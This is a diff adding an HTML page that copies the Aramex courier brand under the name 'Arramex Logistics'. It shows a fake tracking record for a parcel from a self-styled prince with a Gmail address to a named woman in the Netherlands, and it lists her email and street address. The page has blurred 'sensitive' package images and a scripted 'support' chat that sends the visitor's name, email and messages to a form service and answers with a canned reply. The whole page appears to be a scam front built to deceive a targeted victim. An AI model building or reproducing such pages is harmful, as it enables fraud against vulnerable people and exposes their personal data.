@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arramex Logistics</title>
+    <link rel="shortcut icon" href="img/letter-a.png" type="image/x-icon">
+
+    <link rel="stylesheet" href="output.css">
+</head>
+<body>
+    <div id="maincontent">
+         <header class="flex justify-between">
+           <div id="logo">
+           <a href="index.html"><img src="img/aramex-logo-english.webp" alt="" class="w-name p-3 larg:w-56"></a> 
+           </div>
+           <div id="desktop-menu" class=" hidden gap-4 p-3  text-lg font-medium bg-white rounded-md larg:flex ">
+            <p class="hover:text-aramexRed  cursor-pointer border-aramexRed hover:border-b"> Ship and track</p>
+            <p class=" hover:text-aramexRed  cursor-pointer border-aramexRed hover:border-b">Solutions</p>
+            <p class="hover:text-aramexRed cursor-pointer border-aramexRed hover:border-b">Contact us </p>
+            </div>
+            <div class="hidden text-gray-400 p-3 gap-2 larg:flex">
+                <span class="flex">
+                    <img src="img/translate.png" alt="" class="h-7">
+                     <div id="auto-translate-box" >
+                  <select id="languageSwitcher" onchange="changeLanguage(this.value)">
+                    <option value="">🌍 Auto Detect</option>
+                    <option value="en">English</option>
+                    <option value="fr">French</option>
+                    <option value="pt">Portuguese</option>
+                    <option value="es">Spanish</option>
+                    <option value="ar">Arabic</option>
+                  </select>
+              </div>
+                </span>
+                <span class="flex">
+                    <img src="img/pin.png" alt="" class="h-7">
+                    <p>United Arab Emirates</p>
+                </span>
+            </div>
+           <div id="moblie-menu" class=" larg:hidden">
+            <img src="img/icons8-menu-64.png" alt="" class="w-14 p-2 ml-2">
+           </div>
+        </header>
+        <section id="banner" class="h-banner ">
+            <img src="img/card-driverless-trucks-in-logistics.jpg" alt="" class=" h-banner w-full absolute z-0">
+            <div class="h-banner w-full  absolute bg-black bg-opacity-70 z-20 ">
+            </div>
+        </section> 
+        <main class="flex flex-wrap justify-center align-middle font-redHat ">
+            <div class=" w-56 larg:w-72 flex flex-wrap gap-1 justify-center align-middle text-gray-600">
+                <p class="text-xl font-semibold w-name ">RR582903174AE</p>  
+                <img src="img/barcode.png" alt="" class="h-32 w-52">
+                <p class="text-lg "> STATUS:<span class="text-yellow-500 font-bold">AWAITING PARCEL</span></p>
+            </div>
+            <div class="w-reply mt-7 p-5">
+                <h2 class="text-[#DC291E] font-semibold text-base">Tracking</h2>
+                <p class="text-black text-sm mt-1">RR582903174AE</p>
+                <p id="" class="text-aramexRed  font-semibold text-lg">Sender Name:</p>
+                <p id="sender-name"> Prince Fazza Hamandan </p>
+                <p class="text-aramexRed font-semibold text-lg">E-mail:</p>
+                <p id="e-mail">crownedprincesheikhbinsalmanfa@gmail.com</p>
+                <p class="text-aramexRed font-semibold text-lg">Sender address:</p>
+                <p id="Sender-address"> Dubai,United Arab Emirates</p>
+                <p class="text-aramexRed font-semibold text-lg">Reciver:</p>
+                <p class="Reciver-name">Sharmila Mahangi</p>
+                <p class="text-aramexRed font-semibold text-lg">Reciver's Mail:</p>
+                <p class="Reciver-email">shantimahangi@outlook.com</p>
+                <p class="text-aramexRed font-semibold text-lg">Reciver's Address:</p>
+                <p class="Reciver-email">Jan romeinstraat 83 2552KB, Dev-baag. Netherlands</p>
+            </div>
+            <section class="bg-white shadow-md rounded-2xl overflow-hidden">
+<div class="p-6">
+<header class="mb-4 text-center larg:text-left">
+<h1 class="text-2xl font-bold text-aramexRed">Shipment Summary</h1>
+
+
+</header>
+
+
+<!-- Sub-topic / section -->
+<div class="mb-4">
+<h2 class="text-aramexRed font-semibold text-base">Tracking</h2>
+<p class="text-black text-sm mt-1">RR582903174AE</p>
+</div>
+
+
+<div class="mb-4">
+<h2 class="text-aramexRed font-semibold text-base">Status Timeline</h2>
+<ul class="text-black text-sm mt-2 space-y-2">
+<li>2025-12-25 09:42 — Shipment Created (Dubai)</li>
+<li>2025-12-25 19:25 — Arrived at Origin Facility (Al Qusais)</li>
+<li>2025-12-26 03:40 — Cleared for Export (DXB)</li>
+</ul>
+</div>
+
+<!-- ====================================== -->
+<!-- ✅ ADDED: Censored Package & Document Preview -->
+<!-- ====================================== -->
+
+<div class="mt-6 flex flex-wrap gap-4 justify-center pb-2">
+
+  <!-- Package Image (Blurred) -->
+  <div style="position:relative;">
+    <img src="img/Package Docs.jpeg"
+      style="width:140px;height:140px;object-fit:cover;
+      filter:blur(8px);border-radius:12px;">
+    <div style="position:absolute;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:white;
+      background:rgba(0,0,0,0.4);border-radius:12px;">
+      Sensitive Content
+    </div>
+  </div>
+
+  <!-- Document Image (Blurred) -->
+  <div style="position:relative;">
+    <img src="img/Package Content1.jpeg"
+      style="width:140px;height:140px;object-fit:cover;
+      filter:blur(8px);border-radius:12px;">
+    <div style="position:absolute;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:white;
+      background:rgba(0,0,0,0.4);border-radius:12px;">
+      Sensitive Content
+    </div>
+  </div>
+   <!-- Document Image (Blurred) -->
+  <div style="position:relative;">
+    <img src="img/Package Content2.jpeg"
+      style="width:140px;height:140px;object-fit:cover;
+      filter:blur(8px);border-radius:12px;">
+    <div style="position:absolute;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:white;
+      background:rgba(0,0,0,0.4);border-radius:12px;">
+      Sensitive Content
+    </div>
+  </div>
+   <!-- Document Image (Blurred) -->
+  <div style="position:relative;">
+    <img src="img/Package Content3.jpeg"
+      style="width:140px;height:140px;object-fit:cover;
+      filter:blur(8px);border-radius:12px;">
+    <div style="position:absolute;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:white;
+      background:rgba(0,0,0,0.4);border-radius:12px;">
+      Sensitive Content
+    </div>
+  </div>
+   <!-- Document Image (Blurred) -->
+  <div style="position:relative;">
+    <img src="img/Package Content4.jpeg"
+      style="width:140px;height:140px;object-fit:cover;
+      filter:blur(8px);border-radius:12px;">
+    <div style="position:absolute;inset:0;
+      display:flex;align-items:center;justify-content:center;
+      font-size:12px;font-weight:600;color:white;
+      background:rgba(0,0,0,0.4);border-radius:12px;">
+      Sensitive Content
+    </div>
+  </div>
+</div>
+
+<!-- View Button -->
+<div class="text-center mt-4">
+  <button onclick="openPackagePopup()"
+    style="background:#DC291E;color:white;
+    padding:10px 18px;border-radius:10px;
+    font-weight:600; margin-bottom: 40px;">
+    View Package Details
+  </button>
+</div>
+
+
+</div>
+
+</section>
+        </main>
+    </div>
+         <!-- ====================================== -->
+<!-- ✅ ADDED: Auto + Manual Website Translation -->
+<!-- ✅ Detects browser language automatically -->
+<!-- ✅ Allows manual language switching -->
+<!-- ✅ Does NOT modify your original content -->
+<!-- ====================================== -->
+
+<!-- ✅ ADDED: Language Switch UI -->
+<div id="auto-translate-box" style="position:fixed;bottom:20px;left:20px;z-index:9999;background:white;padding:8px;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,0.2);font-size:12px;">
+  <select id="languageSwitcher" onchange="changeLanguage(this.value)">
+    <option value="">🌍 Auto Detect</option>
+    <option value="en">English</option>
+    <option value="fr">French</option>
+    <option value="pt">Portuguese</option>
+    <option value="es">Spanish</option>
+    <option value="ar">Arabic</option>
+  </select>
+</div>
+
+<!-- ✅ ADDED: Function that manually switches language -->
+<script>
+  // ✅ This function manually changes the website language
+  function changeLanguage(lang) {
+    const selectField = document.querySelector("select.goog-te-combo");
+    if (!selectField) return;
+    selectField.value = lang;
+    selectField.dispatchEvent(new Event("change"));
+    localStorage.setItem("selectedLanguage", lang);
+  }
+</script>
+
+<!-- ✅ ADDED: Google Auto Translate Initialization -->
+<script>
+  // ✅ This function loads Google Translator
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({
+      pageLanguage: 'en',
+      autoDisplay: false
+    }, 'google_translate_element');
+  }
+</script>
+
+<!-- ✅ ADDED: Hidden Google Translate Container -->
+<div id="google_translate_element" style="display:none;"></div>
+
+<!-- ✅ ADDED: Google Translate Core Script -->
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<!-- ✅ ADDED: Auto-detect browser language on page load -->
+<script>
+  // ✅ Reads user's browser language and auto-translates
+  document.addEventListener("DOMContentLoaded", function () {
+    const savedLang = localStorage.getItem("selectedLanguage");
+    const browserLang = navigator.language.slice(0, 2);
+    const targetLang = savedLang || browserLang;
+
+    const interval = setInterval(() => {
+      const combo = document.querySelector("select.goog-te-combo");
+      if (combo) {
+        combo.value = targetLang;
+        combo.dispatchEvent(new Event("change"));
+        clearInterval(interval);
+      }
+    }, 500);
+  });
+</script>
+
+<!-- ====================================== -->
+<!-- ✅ END OF TRANSLATION SYSTEM -->
+<!-- ====================================== -->
+ <!-- ====================================== -->
+<!-- ✅ ADDED: Floating Customer Support Button -->
+<!-- ====================================== -->
+
+<div id="support-btn"
+style="position:fixed;bottom:20px;right:20px;
+background:rgba(220,41,30,0.85);
+color:white;
+padding:14px 18px;
+border-radius:999px;
+font-weight:600;
+cursor:pointer;
+z-index:10000;
+box-shadow:0 10px 30px rgba(0,0,0,0.4);"
+onclick="openSupport()">
+💬 Support
+</div>
+
+<!-- ====================================== -->
+<!-- ✅ ADDED: Support Popup (Glassmorphism) -->
+<!-- ====================================== -->
+
+<div id="support-overlay"
+style="display:none;position:fixed;inset:0;
+background:rgba(0,0,0,0.55);
+backdrop-filter:blur(6px);
+z-index:10001;
+align-items:center;
+justify-content:center;">
+
+<div style="
+background:rgba(255,255,255,0.9);
+width:92%;
+max-width:420px;
+border-radius:18px;
+padding:20px;
+box-shadow:0 20px 50px rgba(0,0,0,0.35);
+font-family:system-ui;
+animation:supportFade 0.3s ease;
+">
+
+<!-- Header -->
+<div style="display:flex;justify-content:space-between;align-items:center;">
+<h2 style="color:#DC291E;font-weight:700;font-size:18px;">Customer Support</h2>
+<button onclick="closeSupport()"
+style="background:#DC291E;color:white;
+border:none;border-radius:8px;
+padding:6px 10px;cursor:pointer;">
+Close
+</button>
+</div>
+
+<!-- Chat Area -->
+<div id="chat-box"
+style="margin-top:12px;
+background:rgba(255,255,255,0.6);
+border-radius:12px;
+padding:10px;
+height:180px;
+overflow-y:auto;
+font-size:13px;">
+<div><strong>Support:</strong> Hello 👋 How can we help you today?</div>
+</div>
+
+<!-- Form -->
+<div style="margin-top:12px;">
+<input id="support-name" placeholder="Your name"
+style="width:100%;padding:10px;margin-bottom:8px;border-radius:10px;border:1px solid #ddd;">
+
+<input id="support-email" placeholder="Your email"
+style="width:100%;padding:10px;margin-bottom:8px;border-radius:10px;border:1px solid #ddd;">
+
+<textarea id="support-message" placeholder="Describe your issue..."
+style="width:100%;padding:10px;height:70px;border-radius:10px;border:1px solid #ddd;"></textarea>
+
+<button onclick="sendSupportMessage()"
+style="margin-top:10px;width:100%;
+background:#111;color:white;
+padding:10px;border-radius:10px;
+font-weight:600;">
+Send Message
+</button>
+</div>
+
+</div>
+</div>
+
+<!-- ====================================== -->
+<!-- ✅ ADDED / UPDATED: Support Chat Logic with Formspree -->
+<!-- ====================================== -->
+
+<script>
+  // ✅ Open support popup
+  function openSupport() {
+    document.getElementById("support-overlay").style.display = "flex";
+  }
+
+  // ✅ Close support popup
+  function closeSupport() {
+    document.getElementById("support-overlay").style.display = "none";
+  }
+
+  // ✅ Send message using FORMSPREE (direct email, no mail app)
+  function sendSupportMessage() {
+    const name = document.getElementById("support-name").value;
+    const email = document.getElementById("support-email").value;
+    const message = document.getElementById("support-message").value;
+    const chatBox = document.getElementById("chat-box");
+
+    // ✅ Basic validation
+    if (!name || !email || !message) {
+      alert("Please fill all fields.");
+      return;
+    }
+
+    // ✅ Show user's message in chat UI
+    chatBox.innerHTML += `
+      <div style="margin-top:6px;">
+        <strong>You:</strong> ${message}
+      </div>`;
+    chatBox.scrollTop = chatBox.scrollHeight;
+
+    // ✅ Send message silently to Formspree
+    fetch("https://formspree.io/f/xeoyydvp", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({
+        name: name,
+        email: email,
+        message: message,
+        source: "Arramex Details Page Support"
+      })
+    })
+    .then(response => {
+      // ✅ Auto-response after short delay (chat realism)
+      setTimeout(() => {
+        chatBox.innerHTML += `
+          <div style="margin-top:8px;color:#555;">
+            <strong>Support:</strong>
+            Thank you ${name}. Your message has been received.
+            Our support team will contact your E-mail shortly.
+          </div>`;
+        chatBox.scrollTop = chatBox.scrollHeight;
+      }, 1200);
+
+      // ✅ Clear message field only
+      document.getElementById("support-message").value = "";
+    })
+    .catch(error => {
+      // ❌ Error handling
+      chatBox.innerHTML += `
+        <div style="margin-top:8px;color:red;">
+          <strong>Support:</strong>
+          Something went wrong. Please try again later.
+        </div>`;
+    });
+  }
+</script>
+
+<!-- ✅ ADDED: Support Popup Animation -->
+<style>
+@keyframes supportFade {
+  from { transform: scale(0.95); opacity: 0; }
+  to { transform: scale(1); opacity: 1; }
+}
+</style>
+
+<!-- ====================================== -->
+<!-- ✅ ADDED: Package Details Popup -->
+<!-- ====================================== -->
+
+<div id="package-overlay"
+style="display:none;position:fixed;inset:0;
+background:rgba(0,0,0,0.6);
+backdrop-filter:blur(6px);
+z-index:10002;
+align-items:center;
+justify-content:center;">
+
+<div style="
+background:rgba(255,255,255,0.9);
+padding:20px;
+border-radius:18px;
+max-width:900px;
+width:98%;
+text-align:center;
+box-shadow:0 20px 50px rgba(0,0,0,0.4);
+">
+
+<h2 style="color:#DC291E;font-weight:700;">
+Package & Document Images
+</h2>
+
+<div class="flex justify-center align-middle gap-2 mt-4 w-full">
+  <img src="img/Package Docs.jpeg"
+   class="rounded w-14 md:w-24">
+  <img src="img/Package Content1.jpeg"
+    class="rounded w-14 md:w-24" >
+     <img src="img/Package Content2.jpeg"
+    class="rounded w-14 md:w-24">
+   <img src="img/Package Content3.jpeg"
+    class="rounded w-14 md:w-24" >
+   <img src="img/Package Content4.jpeg"
+    class="rounded w-14 md:w-24" >
+</div>
+
+<!-- Download -->
+<!-- ✅ ADDED: Download All Images (No ZIP) -->
+<button onclick="downloadImagesIndividually()"
+  style="display:inline-block;margin-top:14px;
+  background:#111;color:white;
+  padding:10px 16px;border-radius:10px;">
+  Download Images
+</button>
+
+
+<!-- Close -->
+<button onclick="closePackagePopup()"
+  style="margin-top:10px;
+  background:#DC291E;color:white;
+  padding:10px 16px;border-radius:10px;">
+  Close
+</button>
+
+</div>
+</div>
+<!-- ✅ ADDED: Package Popup Logic -->
+<script>
+function openPackagePopup() {
+  document.getElementById("package-overlay").style.display = "flex";
+}
+function closePackagePopup() {
+  document.getElementById("package-overlay").style.display = "none";
+}
+</script>
+<!-- ✅ ADDED: PDF Download Logic -->
+<script>
+function downloadSummary() {
+  window.print();
+}
+</script>
+
+<!-- ====================================== -->
+<!-- ✅ ADDED: Download Multiple Images Individually -->
+<!-- ====================================== -->
+
+<script>
+function downloadImagesIndividually() {
+  // ✅ List of images to download
+  const images = [
+    "img/Package Docs.jpeg",
+    "img/Package Content1.jpeg",
+    "img/Package Content2.jpeg",
+    "img/Package Content3.jpeg",
+    "img/Package Content4.jpeg"
+  ];
+
+  // ✅ Loop through images and trigger downloads
+  images.forEach((src, index) => {
+    setTimeout(() => {
+      const link = document.createElement("a");
+      link.href = src;
+      link.download = src.split("/").pop();
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }, index * 300); // slight delay to avoid browser blocking
+  });
+}
+</script>
+
+
+</body>
+</html>
